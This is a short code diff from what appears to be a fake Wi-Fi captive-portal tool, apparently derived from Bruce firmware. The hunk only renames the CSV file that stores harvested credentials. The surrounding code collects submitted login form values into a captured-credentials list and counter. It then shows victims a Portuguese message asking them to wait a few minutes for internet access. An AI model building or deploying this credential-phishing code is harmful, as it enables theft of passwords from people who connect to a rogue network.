@@ -52,7 +52,7 @@ public:
         last_cred += param->name().substring(0,1) + ": " + param->value();
       }
       html_temp += "</li>\n";
-      saveToCSV("/Bruce_creds.csv", csvLine);
+      saveToCSV("/webug_creds.csv", csvLine);
       capturedCredentialsHtml = html_temp + capturedCredentialsHtml;
       totalCapturedCredentials++;
       request->send(200, "text/html", getHtmlContents("Por favor, aguarde alguns minutos. Em breve você poderá acessar a internet.")); 
